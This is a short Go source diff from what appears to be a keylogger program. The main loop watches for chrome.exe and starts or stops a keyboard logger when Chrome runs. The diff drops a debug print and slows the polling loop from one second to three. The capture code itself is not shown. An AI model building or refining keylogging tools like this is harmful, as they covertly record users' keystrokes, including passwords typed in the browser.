@@ -42,7 +42,6 @@ func main() {
 			log.Fatal(err)
 		}
 		chrome := winprocessutils.FindProcessByName(procs, "chrome.exe")
-		fmt.Println(chrome)
 		if chrome != nil {
 			fmt.Println(loggerRunning)
 			if !loggerRunning {
@@ -53,7 +52,7 @@ func main() {
 				go keyboardlogger.StopKeyboardLogger(&loggerRunning)
 			}
 		}
-		time.Sleep(1 * time.Second)
+		time.Sleep(3 * time.Second)
 	}
 
 }
